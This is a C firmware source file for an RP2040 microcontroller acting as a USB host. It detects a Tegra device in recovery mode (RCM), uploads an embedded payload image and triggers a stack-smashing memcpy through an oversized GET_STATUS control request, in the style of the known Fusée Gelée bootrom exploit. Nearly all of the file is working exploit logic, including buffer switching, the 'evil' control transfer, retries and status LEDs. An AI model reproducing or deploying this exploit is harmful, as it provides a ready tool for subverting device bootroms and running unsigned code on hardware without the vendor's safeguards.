#include <pico/stdlib.h>
#include <pico/platform.h>
#include <pico/status_led.h>
#include <tusb.h>
#include "host/hcd.h"
#include "host/usbh_pvt.h"
#include <string.h>

#ifndef FUSEE_DEBUG_UART
#define FUSEE_DEBUG_UART 0
#endif

#if FUSEE_DEBUG_UART
#include <pico/stdio_uart.h>
#include <stdio.h>
#define LOG(format, ...) printf("[fusee] " format "\r\n", ##__VA_ARGS__)
#else
#define LOG(format, ...) ((void)0)
#endif

#include "rcm_image.h"

#define USB_VID 0x0955
#define USB_PID 0x7321

#define USB_EP_OUT 0x01u
#define USB_EP_IN 0x81u
#define USB_PACKET_SIZE 0x1000u
#define USB_XFER_TIMEOUT_MS 1000u
#define SMASH_XFER_TIMEOUT_MS 1000u
#define COPY_BUFFER_LOW_ADDR 0x40005000u
#define COPY_BUFFER_HIGH_ADDR 0x40009000u
#define STACK_END 0x40010000u
#define SMASH_BUFFER_SIZE (STACK_END - COPY_BUFFER_HIGH_ADDR)
#define DEBUG_HEARTBEAT_MS 5000u
#define PORT_ATTACH_RETRY_DELAY_MS 500u
#ifndef FUSEE_STATUS_LED_HOLD_MS
#define FUSEE_STATUS_LED_HOLD_MS 3000u
#endif

#ifndef FUSEE_STATUS_LED_RGB_ORDER
#ifdef WAVESHARE_RP2040_ONE
#define FUSEE_STATUS_LED_RGB_ORDER 1
#else
#define FUSEE_STATUS_LED_RGB_ORDER 0
#endif
#endif

#if FUSEE_STATUS_LED_RGB_ORDER
#define STATUS_LED_COLOR_FROM_RGB(r, g, b) PICO_COLORED_STATUS_LED_COLOR_FROM_RGB((g), (r), (b))
#else
#define STATUS_LED_COLOR_FROM_RGB(r, g, b) PICO_COLORED_STATUS_LED_COLOR_FROM_RGB((r), (g), (b))
#endif

#define STATUS_LED_COLOR_BUSY STATUS_LED_COLOR_FROM_RGB(0x00u, 0x00u, 0x40u)
#define STATUS_LED_COLOR_SUCCESS STATUS_LED_COLOR_FROM_RGB(0x00u, 0x40u, 0x00u)
#define STATUS_LED_COLOR_ERROR STATUS_LED_COLOR_FROM_RGB(0x40u, 0x00u, 0x00u)
#define STATUS_LED_COLORED_RESET_US 80u
#define STATUS_LED_SINGLE_BUSY_PERIOD_MS 700u
#define STATUS_LED_SINGLE_BUSY_ON_MS 120u
#define STATUS_LED_SINGLE_ERROR_PERIOD_MS 300u
#define STATUS_LED_SINGLE_ERROR_ON_MS 150u

CFG_TUSB_MEM_ALIGN static uint8_t smash_buffer[SMASH_BUFFER_SIZE] = {0};

const uint32_t COPY_BUFFER_ADDRESSES[2] = {COPY_BUFFER_LOW_ADDR, COPY_BUFFER_HIGH_ADDR};

volatile int error_line = 0;

static int current_buffer = 0;
static uint8_t active_daddr = 0;
static bool host_reset_pending = false;
static bool host_reset_in_progress = false;
static char const *host_reset_reason = "none";
static bool port_was_connected = false;
static bool port_attach_retry_armed = false;
static uint32_t port_attach_retry_due_ms = 0;
static bool forced_attach_pending = false;
static uint32_t forced_attach_due_ms = 0;
static bool status_led_ready = false;

typedef struct {
    volatile bool complete;
    volatile xfer_result_t result;
    volatile uint32_t actual_len;
} sync_xfer_t;

typedef enum {
    FUSEE_STATE_IDLE = 0,
    FUSEE_STATE_READING_ID,
    FUSEE_STATE_UPLOADING,
    FUSEE_STATE_SWITCHING_BUFFER,
    FUSEE_STATE_SMASHING,
    FUSEE_STATE_DONE,
    FUSEE_STATE_ERROR,
} fusee_state_t;

typedef enum {
    LAUNCH_ERROR_NONE = 0,
    LAUNCH_ERROR_DESCRIPTOR,
    LAUNCH_ERROR_DEVICE_ID,
    LAUNCH_ERROR_IMAGE_LAYOUT,
    LAUNCH_ERROR_UPLOAD,
    LAUNCH_ERROR_HIGH_BUFFER,
    LAUNCH_ERROR_SMASH_SUBMIT,
    LAUNCH_ERROR_SMASH_BUFFER,
} launch_error_t;

typedef enum {
    SMASH_RESULT_SUBMITTED = 0,
    SMASH_RESULT_TIMEOUT,
    SMASH_RESULT_BUFFER_TOO_SMALL,
    SMASH_RESULT_SUBMIT_FAILED,
} smash_result_t;

typedef enum {
    STATUS_LED_EVENT_OFF = 0,
    STATUS_LED_EVENT_BUSY,
    STATUS_LED_EVENT_SUCCESS,
    STATUS_LED_EVENT_ERROR,
} status_led_event_t;

volatile launch_error_t last_error = LAUNCH_ERROR_NONE;
volatile fusee_state_t fusee_state = FUSEE_STATE_IDLE;
static status_led_event_t status_led_event = STATUS_LED_EVENT_OFF;
static uint32_t status_led_event_started_ms = 0;
static uint32_t status_led_clear_due_ms = 0;
static bool status_led_output_on = false;

static void debug_init(void);
static void debug_heartbeat(void);
static void service_status_led(void);
static void request_host_reset(char const*);
static void service_host_reset(void);
static void service_connected_port(void);
static void reset_port_attach_tracker(void);
static bool any_device_mounted(void);
static void _panic(int);
static void assert_true(bool, int);
static bool status_led_uses_single_color(void);
static bool status_led_single_event_on(status_led_event_t, uint32_t);
static void set_status_led_color(bool, uint32_t);
static void set_status_led_single_pattern(status_led_event_t, uint32_t);
static void show_status_led_event(status_led_event_t, uint32_t);
static void show_status_led_busy(void);
static void show_status_led_success(void);
static void show_status_led_error(void);
static void clear_status_led_event(void);
void tuh_mount_cb(uint8_t);
static inline uint32_t get_current_buffer_address();
static inline void toggle_buffer();
static void reset_launch_state(void);
static void sync_xfer_cb(tuh_xfer_t*);
static bool wait_for_xfer(sync_xfer_t*, uint32_t);
static bool endpoint_xfer(uint8_t, uint8_t, uint8_t*, uint32_t, uint32_t*, uint32_t, xfer_result_t*);
static smash_result_t trigger_controlled_memcpy(uint8_t);
static bool endpoint_read(uint8_t, uint8_t*, uint32_t);
static bool payload_write(uint8_t, uint8_t const*, uint8_t const*);
static bool switch_to_highbuf(uint8_t);
static void fail_launch(launch_error_t);
static void launch_payload(uint8_t);
static void log_device_id(uint8_t const*);

static bool rcm_driver_init(void);
static bool rcm_driver_deinit(void);
static bool rcm_driver_open(uint8_t, uint8_t, tusb_desc_interface_t const*, uint16_t);
static bool rcm_driver_set_config(uint8_t, uint8_t);
static bool rcm_driver_xfer_cb(uint8_t, uint8_t, xfer_result_t, uint32_t);
static void rcm_driver_close(uint8_t);

static usbh_class_driver_t const rcm_driver[] = {
    {
        .name = "RCM",
        .init = rcm_driver_init,
        .deinit = rcm_driver_deinit,
        .open = rcm_driver_open,
        .set_config = rcm_driver_set_config,
        .xfer_cb = rcm_driver_xfer_cb,
        .close = rcm_driver_close,
    },
};

usbh_class_driver_t const *usbh_app_driver_get_cb(uint8_t *driver_count)
{
    *driver_count = 1;
    return rcm_driver;
}

int main()
{
    status_led_ready = status_led_init();
    debug_init();

    LOG("status led ready=%u status_supported=%u colored_supported=%u via_colored=%u rgb_order=%u",
        status_led_ready, status_led_supported(), colored_status_led_supported(),
        status_led_via_colored_status_led(), FUSEE_STATUS_LED_RGB_ORDER);
    LOG("boot rcm_image=%lu smash_buffer=%lu", (unsigned long) RCM_IMAGE_LEN,
        (unsigned long) sizeof(smash_buffer));

    assert_true(tusb_init(), __LINE__);
    reset_port_attach_tracker();
    LOG("tinyusb initialized");

    while (1)
    {
        tuh_task();
        service_host_reset();
        service_connected_port();
        service_status_led();
        debug_heartbeat();
    }
}

#if FUSEE_DEBUG_UART
static const char *state_name(fusee_state_t state)
{
    switch (state)
    {
        case FUSEE_STATE_IDLE: return "IDLE";
        case FUSEE_STATE_READING_ID: return "READING_ID";
        case FUSEE_STATE_UPLOADING: return "UPLOADING";
        case FUSEE_STATE_SWITCHING_BUFFER: return "SWITCHING_BUFFER";
        case FUSEE_STATE_SMASHING: return "SMASHING";
        case FUSEE_STATE_DONE: return "DONE";
        case FUSEE_STATE_ERROR: return "ERROR";
        default: return "UNKNOWN";
    }
}

static const char *error_name(launch_error_t error)
{
    switch (error)
    {
        case LAUNCH_ERROR_NONE: return "NONE";
        case LAUNCH_ERROR_DESCRIPTOR: return "DESCRIPTOR";
        case LAUNCH_ERROR_DEVICE_ID: return "DEVICE_ID";
        case LAUNCH_ERROR_IMAGE_LAYOUT: return "IMAGE_LAYOUT";
        case LAUNCH_ERROR_UPLOAD: return "UPLOAD";
        case LAUNCH_ERROR_HIGH_BUFFER: return "HIGH_BUFFER";
        case LAUNCH_ERROR_SMASH_SUBMIT: return "SMASH_SUBMIT";
        case LAUNCH_ERROR_SMASH_BUFFER: return "SMASH_BUFFER";
        default: return "UNKNOWN";
    }
}

static const char *smash_result_name(smash_result_t result)
{
    switch (result)
    {
        case SMASH_RESULT_SUBMITTED: return "SUBMITTED";
        case SMASH_RESULT_TIMEOUT: return "TIMEOUT";
        case SMASH_RESULT_BUFFER_TOO_SMALL: return "BUFFER_TOO_SMALL";
        case SMASH_RESULT_SUBMIT_FAILED: return "SUBMIT_FAILED";
        default: return "UNKNOWN";
    }
}

static const char *xfer_result_name(xfer_result_t result)
{
    switch (result)
    {
        case XFER_RESULT_SUCCESS: return "SUCCESS";
        case XFER_RESULT_FAILED: return "FAILED";
        case XFER_RESULT_STALLED: return "STALLED";
        case XFER_RESULT_TIMEOUT: return "TIMEOUT";
        case XFER_RESULT_INVALID: return "INVALID";
        default: return "UNKNOWN";
    }
}

static const char *status_led_event_name(status_led_event_t event)
{
    switch (event)
    {
        case STATUS_LED_EVENT_OFF: return "OFF";
        case STATUS_LED_EVENT_BUSY: return "BUSY";
        case STATUS_LED_EVENT_SUCCESS: return "SUCCESS";
        case STATUS_LED_EVENT_ERROR: return "ERROR";
        default: return "UNKNOWN";
    }
}

static void debug_init(void)
{
    stdio_uart_init();
    sleep_ms(50);
}

static void debug_heartbeat(void)
{
    static uint32_t last_log_ms = 0;
    uint32_t now_ms = to_ms_since_boot(get_absolute_time());

    if ((uint32_t)(now_ms - last_log_ms) >= DEBUG_HEARTBEAT_MS)
    {
        last_log_ms = now_ms;
        LOG("heartbeat state=%s active=%u error=%s buffer=0x%08lx",
            state_name(fusee_state), active_daddr, error_name(last_error),
            (unsigned long) get_current_buffer_address());
    }
}
#else
#define state_name(state) "disabled"
#define error_name(error) "disabled"
#define smash_result_name(result) "disabled"
#define xfer_result_name(result) "disabled"
#define status_led_event_name(event) "disabled"

static void debug_init(void)
{
}

static void debug_heartbeat(void)
{
}
#endif

static void request_host_reset(char const *reason)
{
    if (host_reset_in_progress)
    {
        return;
    }

    if (!host_reset_pending)
    {
        host_reset_reason = reason;
        host_reset_pending = true;
        LOG("host reset requested reason=%s state=%s active=%u", reason,
            state_name(fusee_state), active_daddr);
    }
}

static void service_host_reset(void)
{
    if (!host_reset_pending)
    {
        return;
    }

    LOG("host reset begin reason=%s state=%s active=%u", host_reset_reason,
        state_name(fusee_state), active_daddr);
    host_reset_pending = false;
    host_reset_in_progress = true;

    assert_true(tuh_deinit(0), __LINE__);
    sleep_ms(20);
    if (fusee_state != FUSEE_STATE_IDLE || active_daddr != 0 ||
        last_error != LAUNCH_ERROR_NONE || current_buffer != 0)
    {
        reset_launch_state();
    }
    assert_true(tusb_init(), __LINE__);
    reset_port_attach_tracker();

    if (hcd_port_connect_status(0))
    {
        forced_attach_pending = true;
        forced_attach_due_ms = to_ms_since_boot(get_absolute_time()) + PORT_ATTACH_RETRY_DELAY_MS;
        port_attach_retry_armed = true;
        port_attach_retry_due_ms = forced_attach_due_ms + PORT_ATTACH_RETRY_DELAY_MS;
        LOG("forced attach armed after host reset");
    }

    host_reset_in_progress = false;
    LOG("host reset complete");
}

static void service_connected_port(void)
{
    bool const port_connected = hcd_port_connect_status(0);

    if (!port_connected)
    {
        if (port_was_connected)
        {
            LOG("port disconnected");
        }
        port_was_connected = false;
        port_attach_retry_armed = false;
        forced_attach_pending = false;
        return;
    }

    if (!port_was_connected)
    {
        port_was_connected = true;
        port_attach_retry_armed = true;
        port_attach_retry_due_ms = to_ms_since_boot(get_absolute_time()) + PORT_ATTACH_RETRY_DELAY_MS;
        LOG("port connected edge; attach retry armed");
    }

    if (fusee_state != FUSEE_STATE_IDLE || active_daddr != 0 || host_reset_pending ||
        host_reset_in_progress)
    {
        return;
    }

    if (forced_attach_pending)
    {
        if ((int32_t)(to_ms_since_boot(get_absolute_time()) - forced_attach_due_ms) < 0)
        {
            return;
        }

        forced_attach_pending = false;
        if (!any_device_mounted())
        {
            LOG("queue forced attach after host reset");
            hcd_event_device_attach(0, false);
        }
        return;
    }

    if (!port_attach_retry_armed)
    {
        return;
    }

    if ((int32_t)(to_ms_since_boot(get_absolute_time()) - port_attach_retry_due_ms) < 0)
    {
        return;
    }

    port_attach_retry_armed = false;
    if (!any_device_mounted())
    {
        LOG("connected port edge has no mounted device; reset before attach");
        request_host_reset("connected port recovery");
    }
}

static void reset_port_attach_tracker(void)
{
    port_was_connected = hcd_port_connect_status(0);
    port_attach_retry_armed = false;
    port_attach_retry_due_ms = 0;
    forced_attach_pending = false;
    forced_attach_due_ms = 0;
    LOG("port tracker reset connected=%u", port_was_connected);
}

static bool any_device_mounted(void)
{
    for (uint8_t daddr = 1; daddr <= CFG_TUH_DEVICE_MAX; ++daddr)
    {
        if (tuh_mounted(daddr))
        {
            return true;
        }
    }

    return false;
}

static void _panic(int line_number)
{
    error_line = line_number;
    LOG("panic line=%d", line_number);
    while (1) {
        set_status_led_color(true, STATUS_LED_COLOR_ERROR);
        sleep_ms(300);
        set_status_led_color(false, 0);
        sleep_ms(300);
    }
}
static void assert_true(bool expr, int line)
{
    if (!expr)
        _panic(line);
}

static uint32_t status_led_event_color(status_led_event_t event)
{
    switch (event)
    {
        case STATUS_LED_EVENT_BUSY: return STATUS_LED_COLOR_BUSY;
        case STATUS_LED_EVENT_SUCCESS: return STATUS_LED_COLOR_SUCCESS;
        case STATUS_LED_EVENT_ERROR: return STATUS_LED_COLOR_ERROR;
        case STATUS_LED_EVENT_OFF:
        default: return 0;
    }
}

static bool status_led_uses_single_color(void)
{
    return status_led_supported() && !colored_status_led_supported();
}

static bool status_led_single_event_on(status_led_event_t event, uint32_t elapsed_ms)
{
    switch (event)
    {
        case STATUS_LED_EVENT_BUSY:
            return (elapsed_ms % STATUS_LED_SINGLE_BUSY_PERIOD_MS) <
                STATUS_LED_SINGLE_BUSY_ON_MS;
        case STATUS_LED_EVENT_SUCCESS:
            return true;
        case STATUS_LED_EVENT_ERROR:
            return (elapsed_ms % STATUS_LED_SINGLE_ERROR_PERIOD_MS) <
                STATUS_LED_SINGLE_ERROR_ON_MS;
        case STATUS_LED_EVENT_OFF:
        default:
            return false;
    }
}

static void set_status_led_color(bool led_on, uint32_t color)
{
    bool const colored_supported_now = colored_status_led_supported();
    bool const status_supported_now = status_led_supported();
    bool const via_colored_now = status_led_via_colored_status_led();
    bool const colored_was_on = colored_status_led_get_state();
    bool colored_off_ok = false;
    bool colored_set_ok = false;
    bool status_set_ok = false;
    bool handled = false;

    if (status_led_ready)
    {
        if (colored_supported_now)
        {
            if (led_on)
            {
                colored_off_ok = !colored_was_on || colored_status_led_set_state(false);
                if (colored_was_on && colored_off_ok)
                {
                    sleep_us(STATUS_LED_COLORED_RESET_US);
                }
                colored_set_ok = colored_status_led_set_on_with_color(color);
                if (colored_set_ok)
                {
                    sleep_us(STATUS_LED_COLORED_RESET_US);
                }
                handled = colored_set_ok;
            }
            else
            {
                colored_off_ok = colored_status_led_set_state(false);
                if (colored_off_ok)
                {
                    sleep_us(STATUS_LED_COLORED_RESET_US);
                }
                handled = colored_off_ok;
            }
        }

        if (!handled && status_supported_now)
        {
            status_set_ok = status_led_set_state(led_on);
            handled = status_set_ok;
        }
    }
    status_led_output_on = led_on;

    LOG("led set on=%u color=0x%08lx ready=%u status=%u colored=%u via=%u "
        "colored_was_on=%u colored_off=%u colored_set=%u status_set=%u handled=%u",
        led_on, (unsigned long) color, status_led_ready, status_supported_now,
        colored_supported_now, via_colored_now, colored_was_on, colored_off_ok,
        colored_set_ok, status_set_ok, handled);
}

static void set_status_led_single_pattern(status_led_event_t event, uint32_t now_ms)
{
    bool const led_on = status_led_single_event_on(event,
        now_ms - status_led_event_started_ms);

    if (led_on != status_led_output_on)
    {
        set_status_led_color(led_on, status_led_event_color(event));
    }
}

static void show_status_led_event(status_led_event_t event, uint32_t hold_ms)
{
    uint32_t const now_ms = to_ms_since_boot(get_absolute_time());

    status_led_event = event;
    status_led_event_started_ms = now_ms;
    if (event == STATUS_LED_EVENT_OFF || hold_ms == 0)
    {
        status_led_clear_due_ms = 0;
    }
    else
    {
        status_led_clear_due_ms = now_ms + hold_ms;
    }

    LOG("led event=%s hold=%lu now=%lu due=%lu single=%u",
        status_led_event_name(event), (unsigned long) hold_ms,
        (unsigned long) now_ms, (unsigned long) status_led_clear_due_ms,
        status_led_uses_single_color());
    set_status_led_color(event != STATUS_LED_EVENT_OFF, status_led_event_color(event));
}

static void show_status_led_busy(void)
{
    show_status_led_event(STATUS_LED_EVENT_BUSY, 0);
}

static void show_status_led_success(void)
{
    show_status_led_event(STATUS_LED_EVENT_SUCCESS, FUSEE_STATUS_LED_HOLD_MS);
}

static void show_status_led_error(void)
{
    show_status_led_event(STATUS_LED_EVENT_ERROR, FUSEE_STATUS_LED_HOLD_MS);
}

static void clear_status_led_event(void)
{
    show_status_led_event(STATUS_LED_EVENT_OFF, 0);
}

static void service_status_led(void)
{
    if (status_led_event == STATUS_LED_EVENT_OFF)
    {
        return;
    }

    uint32_t const now_ms = to_ms_since_boot(get_absolute_time());
    if (status_led_clear_due_ms != 0 &&
        (int32_t)(now_ms - status_led_clear_due_ms) >= 0)
    {
        clear_status_led_event();
        return;
    }

    if (status_led_uses_single_color())
    {
        set_status_led_single_pattern(status_led_event, now_ms);
    }
}

static inline void toggle_buffer()
{
    current_buffer = 1 - current_buffer;
}
static inline uint32_t get_current_buffer_address()
{
    return COPY_BUFFER_ADDRESSES[current_buffer];
}

static void reset_launch_state(void)
{
    LOG("reset state=%s active=%u error=%s", state_name(fusee_state),
        active_daddr, error_name(last_error));
    current_buffer = 0;
    active_daddr = 0;
    last_error = LAUNCH_ERROR_NONE;
    fusee_state = FUSEE_STATE_IDLE;
    if (status_led_event == STATUS_LED_EVENT_BUSY)
    {
        clear_status_led_event();
    }
}

static void sync_xfer_cb(tuh_xfer_t *xfer)
{
    sync_xfer_t *sync = (sync_xfer_t*) xfer->user_data;
    sync->result = xfer->result;
    sync->actual_len = xfer->actual_len;
    sync->complete = true;
}

static bool wait_for_xfer(sync_xfer_t *sync, uint32_t timeout_ms)
{
    absolute_time_t deadline = make_timeout_time_ms(timeout_ms);

    while (!sync->complete)
    {
        tuh_task();
        service_status_led();
        if (time_reached(deadline))
        {
            return false;
        }
    }

    return true;
}

static bool endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buffer,
                          uint32_t length, uint32_t *actual_len,
                          uint32_t timeout_ms, xfer_result_t *result)
{
    static sync_xfer_t sync;
    sync.complete = false;
    sync.result = XFER_RESULT_INVALID;
    sync.actual_len = 0;

    tuh_xfer_t xfer = {
        .daddr = daddr,
        .ep_addr = ep_addr,
        .buffer = buffer,
        .buflen = length,
        .complete_cb = sync_xfer_cb,
        .user_data = (uintptr_t) &sync,
    };

    if (!tuh_edpt_xfer(&xfer))
    {
        LOG("xfer submit failed daddr=%u ep=0x%02x len=%lu", daddr, ep_addr,
            (unsigned long) length);
        return false;
    }

    if (!wait_for_xfer(&sync, timeout_ms))
    {
        LOG("xfer timeout daddr=%u ep=0x%02x len=%lu timeout=%lu", daddr,
            ep_addr, (unsigned long) length, (unsigned long) timeout_ms);
        request_host_reset("endpoint timeout");
        return false;
    }

    if (actual_len)
    {
        *actual_len = sync.actual_len;
    }
    if (result)
    {
        *result = sync.result;
    }
    if (sync.result != XFER_RESULT_SUCCESS)
    {
        LOG("xfer result daddr=%u ep=0x%02x len=%lu result=%s actual=%lu",
            daddr, ep_addr, (unsigned long) length,
            xfer_result_name(sync.result), (unsigned long) sync.actual_len);
    }

    return true;
}

static bool rcm_driver_init(void)
{
    return true;
}

static bool rcm_driver_deinit(void)
{
    return true;
}

static bool rcm_driver_open(uint8_t rhport, uint8_t daddr,
                            tusb_desc_interface_t const *itf_desc, uint16_t max_len)
{
    (void) rhport;

    if (itf_desc->bInterfaceClass != TUSB_CLASS_VENDOR_SPECIFIC)
    {
        return false;
    }

    uint16_t vid = 0;
    uint16_t pid = 0;
    if (!tuh_vid_pid_get(daddr, &vid, &pid) || vid != USB_VID || pid != USB_PID)
    {
        return false;
    }

    LOG("driver open daddr=%u vid=0x%04x pid=0x%04x", daddr, vid, pid);

    uint8_t const *desc = (uint8_t const*) itf_desc;
    uint8_t const *end = desc + max_len;
    bool opened_in = false;
    bool opened_out = false;

    desc += itf_desc->bLength;
    while (desc + 2 <= end)
    {
        uint8_t const len = desc[0];
        uint8_t const type = desc[1];
        if (!len || desc + len > end)
        {
            break;
        }

        if (type == TUSB_DESC_ENDPOINT && len >= sizeof(tusb_desc_endpoint_t))
        {
            tusb_desc_endpoint_t const *ep = (tusb_desc_endpoint_t const*) desc;
            if (ep->bmAttributes.xfer == TUSB_XFER_BULK)
            {
                if (ep->bEndpointAddress == USB_EP_IN)
                {
                    opened_in = tuh_edpt_open(daddr, ep);
                }
                else if (ep->bEndpointAddress == USB_EP_OUT)
                {
                    opened_out = tuh_edpt_open(daddr, ep);
                }
            }
        }

        desc += len;
    }

    LOG("driver open endpoints in=%u out=%u", opened_in, opened_out);
    return opened_in && opened_out;
}

static bool rcm_driver_set_config(uint8_t daddr, uint8_t itf_num)
{
    LOG("driver set config daddr=%u itf=%u", daddr, itf_num);
    usbh_driver_set_config_complete(daddr, itf_num);
    return true;
}

static bool rcm_driver_xfer_cb(uint8_t daddr, uint8_t ep_addr,
                               xfer_result_t result, uint32_t xferred_bytes)
{
    (void) daddr;
    (void) ep_addr;
    (void) result;
    (void) xferred_bytes;
    return true;
}

static void rcm_driver_close(uint8_t daddr)
{
    LOG("driver close daddr=%u active=%u state=%s", daddr, active_daddr,
        state_name(fusee_state));
    if (daddr == active_daddr)
    {
        reset_launch_state();
    }
}

static smash_result_t trigger_controlled_memcpy(uint8_t daddr)
{
    uint32_t length = STACK_END - get_current_buffer_address();
    LOG("smash begin daddr=%u len=0x%04lx buffer=0x%08lx", daddr,
        (unsigned long) length, (unsigned long) get_current_buffer_address());

    if (length > sizeof(smash_buffer))
    {
        return SMASH_RESULT_BUFFER_TOO_SMALL;
    }

    tusb_control_request_t evil_setup = {
        .bmRequestType_bit = {
            .direction = TUSB_DIR_IN,
            .type = TUSB_REQ_TYPE_STANDARD,
            .recipient = TUSB_REQ_RCPT_ENDPOINT,
        },
        .bRequest = TUSB_REQ_GET_STATUS,
        .wValue = 0,
        .wIndex = 0,
        .wLength = length,
    };

    static sync_xfer_t sync;
    sync.complete = false;
    sync.result = XFER_RESULT_INVALID;
    sync.actual_len = 0;

    tuh_xfer_t evil = {
        .daddr = daddr,
        .ep_addr = 0,
        .setup = &evil_setup,
        .buffer = smash_buffer,
        .complete_cb = sync_xfer_cb,
        .user_data = (uintptr_t) &sync,
    };

    if (!tuh_control_xfer(&evil))
    {
        LOG("smash submit failed");
        return SMASH_RESULT_SUBMIT_FAILED;
    }

    // The smash normally makes the target stop responding, so a timeout can be
    // the expected end state.
    if (!wait_for_xfer(&sync, SMASH_XFER_TIMEOUT_MS))
    {
        LOG("smash timeout");
        request_host_reset("smash timeout");
        return SMASH_RESULT_TIMEOUT;
    }

    LOG("smash completed result=%s actual=%lu", xfer_result_name(sync.result),
        (unsigned long) sync.actual_len);
    return SMASH_RESULT_SUBMITTED;
}

static bool endpoint_read(uint8_t daddr, uint8_t *buffer, uint32_t length)
{
    uint32_t actual_len = 0;
    xfer_result_t result = XFER_RESULT_INVALID;
    if (!endpoint_xfer(daddr, USB_EP_IN, buffer, length,
                       &actual_len, USB_XFER_TIMEOUT_MS, &result))
    {
        return false;
    }

    if (result != XFER_RESULT_SUCCESS || actual_len != length)
    {
        LOG("read mismatch result=%s actual=%lu expected=%lu",
            xfer_result_name(result), (unsigned long) actual_len,
            (unsigned long) length);
        return false;
    }

    return true;
}

static uint32_t usb_packet_aligned_length(uint32_t length)
{
    return (length + USB_PACKET_SIZE - 1u) & ~(USB_PACKET_SIZE - 1u);
}

static bool payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
{
    uint32_t length = endp - startp;
    uint32_t total = usb_packet_aligned_length(length);
    uint32_t written = 0;
    CFG_TUSB_MEM_ALIGN static uint8_t padded_packet[USB_PACKET_SIZE];

    while (length) {
        uint32_t source_len = length < USB_PACKET_SIZE ? length : USB_PACKET_SIZE;
        uint32_t bytes_to_transmit = USB_PACKET_SIZE;
        uint8_t *buffer = (uint8_t*) startp;

        if (source_len < USB_PACKET_SIZE)
        {
            memcpy(padded_packet, startp, source_len);
            memset(padded_packet + source_len, 0, USB_PACKET_SIZE - source_len);
            buffer = padded_packet;
            LOG("padding final packet payload=%lu zeroes=%lu",
                (unsigned long) source_len,
                (unsigned long) (USB_PACKET_SIZE - source_len));
        }

        length -= source_len;

        toggle_buffer();

        uint32_t actual_len = 0;
        xfer_result_t result = XFER_RESULT_INVALID;
        if (!endpoint_xfer(daddr, USB_EP_OUT, buffer,
                           bytes_to_transmit, &actual_len,
                           USB_XFER_TIMEOUT_MS, &result))
        {
            return false;
        }
        if (result != XFER_RESULT_SUCCESS || actual_len != bytes_to_transmit)
        {
            LOG("write mismatch result=%s actual=%lu expected=%lu written=%lu/%lu",
                xfer_result_name(result), (unsigned long) actual_len,
                (unsigned long) bytes_to_transmit, (unsigned long) written,
                (unsigned long) total);
            return false;
        }
        startp += source_len;
        written += bytes_to_transmit;

        if ((written % (USB_PACKET_SIZE * 8u)) == 0 || written == total)
        {
            LOG("write progress %lu/%lu current_buffer=0x%08lx",
                (unsigned long) written, (unsigned long) total,
                (unsigned long) get_current_buffer_address());
        }
    }

    return true;
}

static bool switch_to_highbuf(uint8_t daddr) {
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
        LOG("switch high buffer from=0x%08lx", (unsigned long) get_current_buffer_address());
        static const uint8_t buf[USB_PACKET_SIZE] = { 0 };
        if (!payload_write(daddr, buf, buf + sizeof(buf)))
        {
            return false;
        }
    }

    LOG("high buffer ready current=0x%08lx", (unsigned long) get_current_buffer_address());
    return true;
}

static void fail_launch(launch_error_t error)
{
    LOG("launch failed error=%s active=%u state=%s", error_name(error),
        active_daddr, state_name(fusee_state));
    show_status_led_error();
    if (active_daddr == 0)
    {
        reset_launch_state();
        return;
    }

    last_error = error;
    fusee_state = FUSEE_STATE_ERROR;
}

static void launch_payload(uint8_t daddr)
{
    uint32_t image_write_len = usb_packet_aligned_length(RCM_IMAGE_LEN);
    LOG("launch start daddr=%u image=%lu write=%lu max=%lu", daddr,
        (unsigned long) RCM_IMAGE_LEN, (unsigned long) image_write_len,
        (unsigned long) RCM_IMAGE_MAX_LENGTH);

    current_buffer = 0;
    active_daddr = daddr;
    last_error = LAUNCH_ERROR_NONE;
    show_status_led_busy();

    if (image_write_len > RCM_IMAGE_MAX_LENGTH)
    {
        fail_launch(LAUNCH_ERROR_IMAGE_LAYOUT);
        return;
    }

    fusee_state = FUSEE_STATE_READING_ID;
    LOG("state=%s", state_name(fusee_state));
    CFG_TUSB_MEM_ALIGN uint8_t device_id[16];
    if (!endpoint_read(daddr, device_id, sizeof(device_id)))
    {
        fail_launch(LAUNCH_ERROR_DEVICE_ID);
        return;
    }
    log_device_id(device_id);

    fusee_state = FUSEE_STATE_UPLOADING;
    LOG("state=%s", state_name(fusee_state));
    if (!payload_write(daddr, rcm_image, rcm_image + RCM_IMAGE_LEN))
    {
        fail_launch(LAUNCH_ERROR_UPLOAD);
        return;
    }

    fusee_state = FUSEE_STATE_SWITCHING_BUFFER;
    LOG("state=%s", state_name(fusee_state));
    if (!switch_to_highbuf(daddr))
    {
        fail_launch(LAUNCH_ERROR_HIGH_BUFFER);
        return;
    }

    fusee_state = FUSEE_STATE_SMASHING;
    LOG("state=%s", state_name(fusee_state));
    smash_result_t smash_result = trigger_controlled_memcpy(daddr);
    LOG("smash result=%s", smash_result_name(smash_result));
    if (smash_result == SMASH_RESULT_BUFFER_TOO_SMALL)
    {
        fail_launch(LAUNCH_ERROR_SMASH_BUFFER);
        return;
    }
    if (smash_result == SMASH_RESULT_SUBMIT_FAILED)
    {
        fail_launch(LAUNCH_ERROR_SMASH_SUBMIT);
        return;
    }

    fusee_state = FUSEE_STATE_DONE;
    LOG("state=%s launch complete", state_name(fusee_state));
    show_status_led_success();
}

static void log_device_id(uint8_t const *device_id)
{
    LOG("device id %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
        device_id[0], device_id[1], device_id[2], device_id[3],
        device_id[4], device_id[5], device_id[6], device_id[7],
        device_id[8], device_id[9], device_id[10], device_id[11],
        device_id[12], device_id[13], device_id[14], device_id[15]);
}

void tuh_mount_cb(uint8_t daddr)
{
    LOG("mount cb daddr=%u state=%s active=%u", daddr, state_name(fusee_state),
        active_daddr);
    if (fusee_state != FUSEE_STATE_IDLE)
    {
        LOG("mount ignored state=%s", state_name(fusee_state));
        return;
    }

    tusb_desc_device_t desc = {0};
    xfer_result_t desc_result = tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t));
    LOG("descriptor result=%s vid=0x%04x pid=0x%04x",
        xfer_result_name(desc_result), desc.idVendor, desc.idProduct);
    if (desc_result != XFER_RESULT_SUCCESS)
    {
        fail_launch(LAUNCH_ERROR_DESCRIPTOR);
        return;
    }
    if (desc.idVendor != USB_VID || desc.idProduct != USB_PID)
    {
        LOG("mount ignored non-rcm vid=0x%04x pid=0x%04x", desc.idVendor,
            desc.idProduct);
        return;
    }

    launch_payload(daddr);
}
